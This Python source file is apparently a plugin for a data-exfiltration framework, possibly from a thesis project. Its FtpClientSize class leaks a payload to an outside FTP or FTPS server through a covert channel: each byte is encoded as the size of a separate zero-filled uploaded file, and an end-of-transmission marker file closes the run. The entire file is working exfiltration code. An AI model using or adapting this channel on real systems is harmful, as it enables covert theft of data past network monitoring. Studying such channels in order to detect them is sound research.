from __future__ import annotations
from typing import Dict, Any, Iterable
from ftplib import FTP, FTP_TLS, error_perm
import io

from tfg.plugins.api import ExfilClientPlugin

BASE = 4096  # tamaño base para distinguir (evitar 0 bytes)


def _connect_ftp(config: Dict[str, Any]) -> FTP:
    host = config["host"]
    port = int(config.get("port", 21))
    user = config.get("user") or "anonymous"
    password = config.get("password") or "anonymous@"

    ftp = FTP()
    ftp.connect(host, port, timeout=30)
    try:
        ftp.login(user=user, passwd=password)
        return ftp
    except error_perm as e:
        msg = str(e).lower()
        ftp.close()
        if "auth" not in msg:
            raise

    ftps = FTP_TLS()
    ftps.connect(host, port, timeout=30)
    ftps.auth()
    ftps.login(user=user, passwd=password)
    ftps.prot_p()
    return ftps


class FtpClientSize(ExfilClientPlugin):
    canal = "FTP"
    metodo = 3
    name = "ftp_client_size"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        root = config.get("root") or "/"
        exfil_id = config.get("exfil_id") or "tfg"

        ftp = _connect_ftp(config)
        if root and root != "/":
            try:
                ftp.cwd(root)
            except Exception:
                ftp.mkd(root)
                ftp.cwd(root)

        seq = 0
        total = 0
        for chunk in payload_iter:
            for b in chunk:
                size = BASE + b  # un byte por fichero
                name = f"{exfil_id}.sz.{seq:06d}"
                ftp.storbinary(f"STOR {name}", io.BytesIO(b"\x00" * size))
                total += 1
                seq += 1
        ftp.storbinary(f"STOR {exfil_id}.EOT", io.BytesIO(b""))
        ftp.quit()
        return {"ok": True, "files": seq, "bytes": total}
